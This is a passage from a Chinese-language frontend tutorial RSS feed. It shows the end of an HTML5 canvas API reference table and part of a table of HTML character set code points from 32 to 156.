<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fillText()</td>
<td style="text-align:left">在画布上绘制 “被填充的” 文本</td>
</tr>
<tr>
<td style="text-align:center">strokeText()</td>
<td style="text-align:left">在画布上绘制文本（无填充）</td>
</tr>
<tr>
<td style="text-align:center">measureText()</td>
<td style="text-align:left">返回包含指定文本宽度的对象</td>
</tr>
</tbody>
</table>
<h2> 图像绘制</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">drawImage()</td>
<td style="text-align:left">向画布上绘制图像、画布或视频</td>
</tr>
</tbody>
</table>
<h2> 像素操作</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">width</td>
<td style="text-align:left">返回 ImageData 对象的宽度</td>
</tr>
<tr>
<td style="text-align:center">height</td>
<td style="text-align:left">返回 ImageData 对象的高度</td>
</tr>
<tr>
<td style="text-align:center">data</td>
<td style="text-align:left">返回一个对象，其包含指定的 ImageData 对象的图像数据</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">createImageData()</td>
<td style="text-align:left">创建新的、空白的 ImageData 对象</td>
</tr>
<tr>
<td style="text-align:center">getImageData()</td>
<td style="text-align:left">返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据</td>
</tr>
<tr>
<td style="text-align:center">putImageData()</td>
<td style="text-align:left">把图像数据（从指定的 ImageData 对象）放回画布上</td>
</tr>
</tbody>
</table>
<h2> 合成</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">globalAlpha</td>
<td style="text-align:left">设置或返回绘图的当前 alpha 或透明值</td>
</tr>
<tr>
<td style="text-align:center">globalCompositeOperation</td>
<td style="text-align:left">设置或返回新图像如何绘制到已有的图像上</td>
</tr>
</tbody>
</table>
<h2> 其他</h2>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">save()</td>
<td style="text-align:left">保存当前环境的状态</td>
</tr>
<tr>
<td style="text-align:center">restore()</td>
<td style="text-align:left">返回之前保存过的路径状态和属性</td>
</tr>
<tr>
<td style="text-align:center">createEvent()</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center">getContext()</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center">toDataURL()</td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>字符集</title>
      <link>https://sankgao.github.io/languages/html5/references/charactersets.html</link>
      <guid>https://sankgao.github.io/languages/html5/references/charactersets.html</guid>
      <source url="https://sankgao.github.io/rss.xml">字符集</source>
      <description>下面为常见的 HTML 字符集，HTML5 中的默认字符集为 UTF-8。 数字 ASCII ANSI 8859-1 UTF-8 描述 :----: :----: :----: :----: :----: :---- 32 space 33 ! ! ! ! exclamation mark 34 &amp;quot; &amp;quot; &amp;quot; &amp;quot; quotation mark 35 # ...</description>
      <category>Frontend</category>
      <pubDate>Fri, 12 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>下面为常见的 HTML 字符集，HTML5 中的默认字符集为 <code>UTF-8</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:center">数字</th>
<th style="text-align:center">ASCII</th>
<th style="text-align:center">ANSI</th>
<th style="text-align:center">8859-1</th>
<th style="text-align:center">UTF-8</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">32</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">space</td>
</tr>
<tr>
<td style="text-align:center">33</td>
<td style="text-align:center">!</td>
<td style="text-align:center">!</td>
<td style="text-align:center">!</td>
<td style="text-align:center">!</td>
<td style="text-align:left">exclamation mark</td>
</tr>
<tr>
<td style="text-align:center">34</td>
<td style="text-align:center">"</td>
<td style="text-align:center">"</td>
<td style="text-align:center">"</td>
<td style="text-align:center">"</td>
<td style="text-align:left">quotation mark</td>
</tr>
<tr>
<td style="text-align:center">35</td>
<td style="text-align:center">#</td>
<td style="text-align:center">#</td>
<td style="text-align:center">#</td>
<td style="text-align:center">#</td>
<td style="text-align:left">number sign</td>
</tr>
<tr>
<td style="text-align:center">36</td>
<td style="text-align:center">$</td>
<td style="text-align:center">$</td>
<td style="text-align:center">$</td>
<td style="text-align:center">$</td>
<td style="text-align:left">dollar sign</td>
</tr>
<tr>
<td style="text-align:center">37</td>
<td style="text-align:center">%</td>
<td style="text-align:center">%</td>
<td style="text-align:center">%</td>
<td style="text-align:center">%</td>
<td style="text-align:left">percent sign</td>
</tr>
<tr>
<td style="text-align:center">38</td>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">&amp;</td>
<td style="text-align:left">ampersand</td>
</tr>
<tr>
<td style="text-align:center">39</td>
<td style="text-align:center">'</td>
<td style="text-align:center">'</td>
<td style="text-align:center">'</td>
<td style="text-align:center">'</td>
<td style="text-align:left">apostrophe</td>
</tr>
<tr>
<td style="text-align:center">40</td>
<td style="text-align:center">(</td>
<td style="text-align:center">(</td>
<td style="text-align:center">(</td>
<td style="text-align:center">(</td>
<td style="text-align:left">left parenthesis</td>
</tr>
<tr>
<td style="text-align:center">41</td>
<td style="text-align:center">)</td>
<td style="text-align:center">)</td>
<td style="text-align:center">)</td>
<td style="text-align:center">)</td>
<td style="text-align:left">right parenthesis</td>
</tr>
<tr>
<td style="text-align:center">42</td>
<td style="text-align:center">*</td>
<td style="text-align:center">*</td>
<td style="text-align:center">*</td>
<td style="text-align:center">*</td>
<td style="text-align:left">asterisk</td>
</tr>
<tr>
<td style="text-align:center">43</td>
<td style="text-align:center">+</td>
<td style="text-align:center">+</td>
<td style="text-align:center">+</td>
<td style="text-align:center">+</td>
<td style="text-align:left">plus sign</td>
</tr>
<tr>
<td style="text-align:center">44</td>
<td style="text-align:center">,</td>
<td style="text-align:center">,</td>
<td style="text-align:center">,</td>
<td style="text-align:center">,</td>
<td style="text-align:left">comma</td>
</tr>
<tr>
<td style="text-align:center">45</td>
<td style="text-align:center">-</td>
<td style="text-align:center">-</td>
<td style="text-align:center">-</td>
<td style="text-align:center">-</td>
<td style="text-align:left">hyphen-minus</td>
</tr>
<tr>
<td style="text-align:center">46</td>
<td style="text-align:center">.</td>
<td style="text-align:center">.</td>
<td style="text-align:center">.</td>
<td style="text-align:center">.</td>
<td style="text-align:left">full stop</td>
</tr>
<tr>
<td style="text-align:center">47</td>
<td style="text-align:center">/</td>
<td style="text-align:center">/</td>
<td style="text-align:center">/</td>
<td style="text-align:center">/</td>
<td style="text-align:left">solidus</td>
</tr>
<tr>
<td style="text-align:center">48</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:left">digit zero</td>
</tr>
<tr>
<td style="text-align:center">49</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:left">digit one</td>
</tr>
<tr>
<td style="text-align:center">50</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:left">digit two</td>
</tr>
<tr>
<td style="text-align:center">51</td>
<td style="text-align:center">3</td>
<td style="text-align:center">3</td>
<td style="text-align:center">3</td>
<td style="text-align:center">3</td>
<td style="text-align:left">digit three</td>
</tr>
<tr>
<td style="text-align:center">52</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
<td style="text-align:left">digit four</td>
</tr>
<tr>
<td style="text-align:center">53</td>
<td style="text-align:center">5</td>
<td style="text-align:center">5</td>
<td style="text-align:center">5</td>
<td style="text-align:center">5</td>
<td style="text-align:left">digit five</td>
</tr>
<tr>
<td style="text-align:center">54</td>
<td style="text-align:center">6</td>
<td style="text-align:center">6</td>
<td style="text-align:center">6</td>
<td style="text-align:center">6</td>
<td style="text-align:left">digit six</td>
</tr>
<tr>
<td style="text-align:center">55</td>
<td style="text-align:center">7</td>
<td style="text-align:center">7</td>
<td style="text-align:center">7</td>
<td style="text-align:center">7</td>
<td style="text-align:left">digit seven</td>
</tr>
<tr>
<td style="text-align:center">56</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
<td style="text-align:left">digit eight</td>
</tr>
<tr>
<td style="text-align:center">57</td>
<td style="text-align:center">9</td>
<td style="text-align:center">9</td>
<td style="text-align:center">9</td>
<td style="text-align:center">9</td>
<td style="text-align:left">digit nine</td>
</tr>
<tr>
<td style="text-align:center">58</td>
<td style="text-align:center">:</td>
<td style="text-align:center">:</td>
<td style="text-align:center">:</td>
<td style="text-align:center">:</td>
<td style="text-align:left">colon</td>
</tr>
<tr>
<td style="text-align:center">59</td>
<td style="text-align:center">;</td>
<td style="text-align:center">;</td>
<td style="text-align:center">;</td>
<td style="text-align:center">;</td>
<td style="text-align:left">semicolon</td>
</tr>
<tr>
<td style="text-align:center">60</td>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">&lt;</td>
<td style="text-align:left">less-than sign</td>
</tr>
<tr>
<td style="text-align:center">61</td>
<td style="text-align:center">=</td>
<td style="text-align:center">=</td>
<td style="text-align:center">=</td>
<td style="text-align:center">=</td>
<td style="text-align:left">equals sign</td>
</tr>
<tr>
<td style="text-align:center">62</td>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">&gt;</td>
<td style="text-align:left">greater-than sign</td>
</tr>
<tr>
<td style="text-align:center">63</td>
<td style="text-align:center">?</td>
<td style="text-align:center">?</td>
<td style="text-align:center">?</td>
<td style="text-align:center">?</td>
<td style="text-align:left">question mark</td>
</tr>
<tr>
<td style="text-align:center">64</td>
<td style="text-align:center">@</td>
<td style="text-align:center">@</td>
<td style="text-align:center">@</td>
<td style="text-align:center">@</td>
<td style="text-align:left">commercial at</td>
</tr>
<tr>
<td style="text-align:center">65</td>
<td style="text-align:center">A</td>
<td style="text-align:center">A</td>
<td style="text-align:center">A</td>
<td style="text-align:center">A</td>
<td style="text-align:left">Latin capital letter A</td>
</tr>
<tr>
<td style="text-align:center">66</td>
<td style="text-align:center">B</td>
<td style="text-align:center">B</td>
<td style="text-align:center">B</td>
<td style="text-align:center">B</td>
<td style="text-align:left">Latin capital letter B</td>
</tr>
<tr>
<td style="text-align:center">67</td>
<td style="text-align:center">C</td>
<td style="text-align:center">C</td>
<td style="text-align:center">C</td>
<td style="text-align:center">C</td>
<td style="text-align:left">Latin capital letter C</td>
</tr>
<tr>
<td style="text-align:center">68</td>
<td style="text-align:center">D</td>
<td style="text-align:center">D</td>
<td style="text-align:center">D</td>
<td style="text-align:center">D</td>
<td style="text-align:left">Latin capital letter D</td>
</tr>
<tr>
<td style="text-align:center">69</td>
<td style="text-align:center">E</td>
<td style="text-align:center">E</td>
<td style="text-align:center">E</td>
<td style="text-align:center">E</td>
<td style="text-align:left">Latin capital letter E</td>
</tr>
<tr>
<td style="text-align:center">70</td>
<td style="text-align:center">F</td>
<td style="text-align:center">F</td>
<td style="text-align:center">F</td>
<td style="text-align:center">F</td>
<td style="text-align:left">Latin capital letter F</td>
</tr>
<tr>
<td style="text-align:center">71</td>
<td style="text-align:center">G</td>
<td style="text-align:center">G</td>
<td style="text-align:center">G</td>
<td style="text-align:center">G</td>
<td style="text-align:left">Latin capital letter G</td>
</tr>
<tr>
<td style="text-align:center">72</td>
<td style="text-align:center">H</td>
<td style="text-align:center">H</td>
<td style="text-align:center">H</td>
<td style="text-align:center">H</td>
<td style="text-align:left">Latin capital letter H</td>
</tr>
<tr>
<td style="text-align:center">73</td>
<td style="text-align:center">I</td>
<td style="text-align:center">I</td>
<td style="text-align:center">I</td>
<td style="text-align:center">I</td>
<td style="text-align:left">Latin capital letter I</td>
</tr>
<tr>
<td style="text-align:center">74</td>
<td style="text-align:center">J</td>
<td style="text-align:center">J</td>
<td style="text-align:center">J</td>
<td style="text-align:center">J</td>
<td style="text-align:left">Latin capital letter J</td>
</tr>
<tr>
<td style="text-align:center">75</td>
<td style="text-align:center">K</td>
<td style="text-align:center">K</td>
<td style="text-align:center">K</td>
<td style="text-align:center">K</td>
<td style="text-align:left">Latin capital letter K</td>
</tr>
<tr>
<td style="text-align:center">76</td>
<td style="text-align:center">L</td>
<td style="text-align:center">L</td>
<td style="text-align:center">L</td>
<td style="text-align:center">L</td>
<td style="text-align:left">Latin capital letter L</td>
</tr>
<tr>
<td style="text-align:center">77</td>
<td style="text-align:center">M</td>
<td style="text-align:center">M</td>
<td style="text-align:center">M</td>
<td style="text-align:center">M</td>
<td style="text-align:left">Latin capital letter M</td>
</tr>
<tr>
<td style="text-align:center">78</td>
<td style="text-align:center">N</td>
<td style="text-align:center">N</td>
<td style="text-align:center">N</td>
<td style="text-align:center">N</td>
<td style="text-align:left">Latin capital letter N</td>
</tr>
<tr>
<td style="text-align:center">79</td>
<td style="text-align:center">O</td>
<td style="text-align:center">O</td>
<td style="text-align:center">O</td>
<td style="text-align:center">O</td>
<td style="text-align:left">Latin capital letter O</td>
</tr>
<tr>
<td style="text-align:center">80</td>
<td style="text-align:center">P</td>
<td style="text-align:center">P</td>
<td style="text-align:center">P</td>
<td style="text-align:center">P</td>
<td style="text-align:left">Latin capital letter P</td>
</tr>
<tr>
<td style="text-align:center">81</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">Q</td>
<td style="text-align:left">Latin capital letter Q</td>
</tr>
<tr>
<td style="text-align:center">82</td>
<td style="text-align:center">R</td>
<td style="text-align:center">R</td>
<td style="text-align:center">R</td>
<td style="text-align:center">R</td>
<td style="text-align:left">Latin capital letter R</td>
</tr>
<tr>
<td style="text-align:center">83</td>
<td style="text-align:center">S</td>
<td style="text-align:center">S</td>
<td style="text-align:center">S</td>
<td style="text-align:center">S</td>
<td style="text-align:left">Latin capital letter S</td>
</tr>
<tr>
<td style="text-align:center">84</td>
<td style="text-align:center">T</td>
<td style="text-align:center">T</td>
<td style="text-align:center">T</td>
<td style="text-align:center">T</td>
<td style="text-align:left">Latin capital letter T</td>
</tr>
<tr>
<td style="text-align:center">85</td>
<td style="text-align:center">U</td>
<td style="text-align:center">U</td>
<td style="text-align:center">U</td>
<td style="text-align:center">U</td>
<td style="text-align:left">Latin capital letter U</td>
</tr>
<tr>
<td style="text-align:center">86</td>
<td style="text-align:center">V</td>
<td style="text-align:center">V</td>
<td style="text-align:center">V</td>
<td style="text-align:center">V</td>
<td style="text-align:left">Latin capital letter V</td>
</tr>
<tr>
<td style="text-align:center">87</td>
<td style="text-align:center">W</td>
<td style="text-align:center">W</td>
<td style="text-align:center">W</td>
<td style="text-align:center">W</td>
<td style="text-align:left">Latin capital letter W</td>
</tr>
<tr>
<td style="text-align:center">88</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:center">X</td>
<td style="text-align:left">Latin capital letter X</td>
</tr>
<tr>
<td style="text-align:center">89</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:left">Latin capital letter Y</td>
</tr>
<tr>
<td style="text-align:center">90</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">Z</td>
<td style="text-align:left">Latin capital letter Z</td>
</tr>
<tr>
<td style="text-align:center">91</td>
<td style="text-align:center">[</td>
<td style="text-align:center">[</td>
<td style="text-align:center">[</td>
<td style="text-align:center">[</td>
<td style="text-align:left">left square bracket</td>
</tr>
<tr>
<td style="text-align:center">92</td>
<td style="text-align:center">\</td>
<td style="text-align:center">\</td>
<td style="text-align:center">\</td>
<td style="text-align:center">\</td>
<td style="text-align:left">reverse solidus</td>
</tr>
<tr>
<td style="text-align:center">93</td>
<td style="text-align:center">]</td>
<td style="text-align:center">]</td>
<td style="text-align:center">]</td>
<td style="text-align:center">]</td>
<td style="text-align:left">right square bracket</td>
</tr>
<tr>
<td style="text-align:center">94</td>
<td style="text-align:center">^</td>
<td style="text-align:center">^</td>
<td style="text-align:center">^</td>
<td style="text-align:center">^</td>
<td style="text-align:left">circumflex accent</td>
</tr>
<tr>
<td style="text-align:center">95</td>
<td style="text-align:center">_</td>
<td style="text-align:center">_</td>
<td style="text-align:center">_</td>
<td style="text-align:center">_</td>
<td style="text-align:left">low line</td>
</tr>
<tr>
<td style="text-align:center">96</td>
<td style="text-align:center">`</td>
<td style="text-align:center">`</td>
<td style="text-align:center">`</td>
<td style="text-align:center">`</td>
<td style="text-align:left">grave accent</td>
</tr>
<tr>
<td style="text-align:center">97</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:left">Latin small letter a</td>
</tr>
<tr>
<td style="text-align:center">98</td>
<td style="text-align:center">b</td>
<td style="text-align:center">b</td>
<td style="text-align:center">b</td>
<td style="text-align:center">b</td>
<td style="text-align:left">Latin small letter b</td>
</tr>
<tr>
<td style="text-align:center">99</td>
<td style="text-align:center">c</td>
<td style="text-align:center">c</td>
<td style="text-align:center">c</td>
<td style="text-align:center">c</td>
<td style="text-align:left">Latin small letter c</td>
</tr>
<tr>
<td style="text-align:center">100</td>
<td style="text-align:center">d</td>
<td style="text-align:center">d</td>
<td style="text-align:center">d</td>
<td style="text-align:center">d</td>
<td style="text-align:left">Latin small letter d</td>
</tr>
<tr>
<td style="text-align:center">101</td>
<td style="text-align:center">e</td>
<td style="text-align:center">e</td>
<td style="text-align:center">e</td>
<td style="text-align:center">e</td>
<td style="text-align:left">Latin small letter e</td>
</tr>
<tr>
<td style="text-align:center">102</td>
<td style="text-align:center">f</td>
<td style="text-align:center">f</td>
<td style="text-align:center">f</td>
<td style="text-align:center">f</td>
<td style="text-align:left">Latin small letter f</td>
</tr>
<tr>
<td style="text-align:center">103</td>
<td style="text-align:center">g</td>
<td style="text-align:center">g</td>
<td style="text-align:center">g</td>
<td style="text-align:center">g</td>
<td style="text-align:left">Latin small letter g</td>
</tr>
<tr>
<td style="text-align:center">104</td>
<td style="text-align:center">h</td>
<td style="text-align:center">h</td>
<td style="text-align:center">h</td>
<td style="text-align:center">h</td>
<td style="text-align:left">Latin small letter h</td>
</tr>
<tr>
<td style="text-align:center">105</td>
<td style="text-align:center">i</td>
<td style="text-align:center">i</td>
<td style="text-align:center">i</td>
<td style="text-align:center">i</td>
<td style="text-align:left">Latin small letter i</td>
</tr>
<tr>
<td style="text-align:center">106</td>
<td style="text-align:center">j</td>
<td style="text-align:center">j</td>
<td style="text-align:center">j</td>
<td style="text-align:center">j</td>
<td style="text-align:left">Latin small letter j</td>
</tr>
<tr>
<td style="text-align:center">107</td>
<td style="text-align:center">k</td>
<td style="text-align:center">k</td>
<td style="text-align:center">k</td>
<td style="text-align:center">k</td>
<td style="text-align:left">Latin small letter k</td>
</tr>
<tr>
<td style="text-align:center">108</td>
<td style="text-align:center">l</td>
<td style="text-align:center">l</td>
<td style="text-align:center">l</td>
<td style="text-align:center">l</td>
<td style="text-align:left">Latin small letter l</td>
</tr>
<tr>
<td style="text-align:center">109</td>
<td style="text-align:center">m</td>
<td style="text-align:center">m</td>
<td style="text-align:center">m</td>
<td style="text-align:center">m</td>
<td style="text-align:left">Latin small letter m</td>
</tr>
<tr>
<td style="text-align:center">110</td>
<td style="text-align:center">n</td>
<td style="text-align:center">n</td>
<td style="text-align:center">n</td>
<td style="text-align:center">n</td>
<td style="text-align:left">Latin small letter n</td>
</tr>
<tr>
<td style="text-align:center">111</td>
<td style="text-align:center">o</td>
<td style="text-align:center">o</td>
<td style="text-align:center">o</td>
<td style="text-align:center">o</td>
<td style="text-align:left">Latin small letter o</td>
</tr>
<tr>
<td style="text-align:center">112</td>
<td style="text-align:center">p</td>
<td style="text-align:center">p</td>
<td style="text-align:center">p</td>
<td style="text-align:center">p</td>
<td style="text-align:left">Latin small letter p</td>
</tr>
<tr>
<td style="text-align:center">113</td>
<td style="text-align:center">q</td>
<td style="text-align:center">q</td>
<td style="text-align:center">q</td>
<td style="text-align:center">q</td>
<td style="text-align:left">Latin small letter q</td>
</tr>
<tr>
<td style="text-align:center">114</td>
<td style="text-align:center">r</td>
<td style="text-align:center">r</td>
<td style="text-align:center">r</td>
<td style="text-align:center">r</td>
<td style="text-align:left">Latin small letter r</td>
</tr>
<tr>
<td style="text-align:center">115</td>
<td style="text-align:center">s</td>
<td style="text-align:center">s</td>
<td style="text-align:center">s</td>
<td style="text-align:center">s</td>
<td style="text-align:left">Latin small letter s</td>
</tr>
<tr>
<td style="text-align:center">116</td>
<td style="text-align:center">t</td>
<td style="text-align:center">t</td>
<td style="text-align:center">t</td>
<td style="text-align:center">t</td>
<td style="text-align:left">Latin small letter t</td>
</tr>
<tr>
<td style="text-align:center">117</td>
<td style="text-align:center">u</td>
<td style="text-align:center">u</td>
<td style="text-align:center">u</td>
<td style="text-align:center">u</td>
<td style="text-align:left">Latin small letter u</td>
</tr>
<tr>
<td style="text-align:center">118</td>
<td style="text-align:center">v</td>
<td style="text-align:center">v</td>
<td style="text-align:center">v</td>
<td style="text-align:center">v</td>
<td style="text-align:left">Latin small letter v</td>
</tr>
<tr>
<td style="text-align:center">119</td>
<td style="text-align:center">w</td>
<td style="text-align:center">w</td>
<td style="text-align:center">w</td>
<td style="text-align:center">w</td>
<td style="text-align:left">Latin small letter w</td>
</tr>
<tr>
<td style="text-align:center">120</td>
<td style="text-align:center">x</td>
<td style="text-align:center">x</td>
<td style="text-align:center">x</td>
<td style="text-align:center">x</td>
<td style="text-align:left">Latin small letter x</td>
</tr>
<tr>
<td style="text-align:center">121</td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:left">Latin small letter y</td>
</tr>
<tr>
<td style="text-align:center">122</td>
<td style="text-align:center">z</td>
<td style="text-align:center">z</td>
<td style="text-align:center">z</td>
<td style="text-align:center">z</td>
<td style="text-align:left">Latin small letter z</td>
</tr>
<tr>
<td style="text-align:center">123</td>
<td style="text-align:center">{</td>
<td style="text-align:center">{</td>
<td style="text-align:center">{</td>
<td style="text-align:center">{</td>
<td style="text-align:left">left curly bracket</td>
</tr>
<tr>
<td style="text-align:center">124</td>
<td style="text-align:center">|</td>
<td style="text-align:center">|</td>
<td style="text-align:center">|</td>
<td style="text-align:center">|</td>
<td style="text-align:left">vertical line</td>
</tr>
<tr>
<td style="text-align:center">125</td>
<td style="text-align:center">}</td>
<td style="text-align:center">}</td>
<td style="text-align:center">}</td>
<td style="text-align:center">}</td>
<td style="text-align:left">right curly bracket</td>
</tr>
<tr>
<td style="text-align:center">126</td>
<td style="text-align:center">~</td>
<td style="text-align:center">~</td>
<td style="text-align:center">~</td>
<td style="text-align:center">~</td>
<td style="text-align:left">tilde</td>
</tr>
<tr>
<td style="text-align:center">127</td>
<td style="text-align:center">DEL</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center">128</td>
<td style="text-align:center"></td>
<td style="text-align:center">€</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">euro sign</td>
</tr>
<tr>
<td style="text-align:center">129</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">NOT USED</td>
</tr>
<tr>
<td style="text-align:center">130</td>
<td style="text-align:center"></td>
<td style="text-align:center">‚</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">single low-9 quotation mark</td>
</tr>
<tr>
<td style="text-align:center">131</td>
<td style="text-align:center"></td>
<td style="text-align:center">ƒ</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin small letter f with hook</td>
</tr>
<tr>
<td style="text-align:center">132</td>
<td style="text-align:center"></td>
<td style="text-align:center">„</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">double low-9 quotation mark</td>
</tr>
<tr>
<td style="text-align:center">133</td>
<td style="text-align:center"></td>
<td style="text-align:center">…</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">horizontal ellipsis</td>
</tr>
<tr>
<td style="text-align:center">134</td>
<td style="text-align:center"></td>
<td style="text-align:center">†</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">dagger</td>
</tr>
<tr>
<td style="text-align:center">135</td>
<td style="text-align:center"></td>
<td style="text-align:center">‡</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">double dagger</td>
</tr>
<tr>
<td style="text-align:center">136</td>
<td style="text-align:center"></td>
<td style="text-align:center">ˆ</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">modifier letter circumflex accent</td>
</tr>
<tr>
<td style="text-align:center">137</td>
<td style="text-align:center"></td>
<td style="text-align:center">‰</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">per mille sign</td>
</tr>
<tr>
<td style="text-align:center">138</td>
<td style="text-align:center"></td>
<td style="text-align:center">Š</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin capital letter S with caron</td>
</tr>
<tr>
<td style="text-align:center">139</td>
<td style="text-align:center"></td>
<td style="text-align:center">‹</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">single left-pointing angle quotation mark</td>
</tr>
<tr>
<td style="text-align:center">140</td>
<td style="text-align:center"></td>
<td style="text-align:center">Œ</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin capital ligature OE</td>
</tr>
<tr>
<td style="text-align:center">141</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">NOT USED</td>
</tr>
<tr>
<td style="text-align:center">142</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ž</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin capital letter Z with caron</td>
</tr>
<tr>
<td style="text-align:center">143</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">NOT USED</td>
</tr>
<tr>
<td style="text-align:center">144</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">NOT USED</td>
</tr>
<tr>
<td style="text-align:center">145</td>
<td style="text-align:center"></td>
<td style="text-align:center">‘</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">left single quotation mark</td>
</tr>
<tr>
<td style="text-align:center">146</td>
<td style="text-align:center"></td>
<td style="text-align:center">’</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">right single quotation mark</td>
</tr>
<tr>
<td style="text-align:center">147</td>
<td style="text-align:center"></td>
<td style="text-align:center">“</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">left double quotation mark</td>
</tr>
<tr>
<td style="text-align:center">148</td>
<td style="text-align:center"></td>
<td style="text-align:center">”</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">right double quotation mark</td>
</tr>
<tr>
<td style="text-align:center">149</td>
<td style="text-align:center"></td>
<td style="text-align:center">•</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">bullet</td>
</tr>
<tr>
<td style="text-align:center">150</td>
<td style="text-align:center"></td>
<td style="text-align:center">–</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">en dash</td>
</tr>
<tr>
<td style="text-align:center">151</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">em dash</td>
</tr>
<tr>
<td style="text-align:center">152</td>
<td style="text-align:center"></td>
<td style="text-align:center">˜</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">small tilde</td>
</tr>
<tr>
<td style="text-align:center">153</td>
<td style="text-align:center"></td>
<td style="text-align:center">™</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">trade mark sign</td>
</tr>
<tr>
<td style="text-align:center">154</td>
<td style="text-align:center"></td>
<td style="text-align:center">š</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin small letter s with caron</td>
</tr>
<tr>
<td style="text-align:center">155</td>
<td style="text-align:center"></td>
<td style="text-align:center">›</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">single right-pointing angle quotation mark</td>
</tr>
<tr>
<td style="text-align:center">156</td>
